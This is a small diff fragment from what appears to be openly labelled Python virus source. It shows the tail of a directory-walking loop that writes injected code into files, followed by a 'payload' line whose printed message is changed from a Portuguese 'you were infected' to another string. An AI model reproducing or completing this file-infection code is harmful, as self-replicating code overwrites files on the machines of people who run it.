@@ -38,6 +38,6 @@ for root, dirs, files in os.walk(dir_path):
                 with open(file, 'w') as f:
                     f.writelines(final_code)
 # Malicious Piece of Code (Payload)
-print('kkkkk,Vc foi infectado')
+print('GhosteHypxw')
 
 ### END OF VIRUS ###
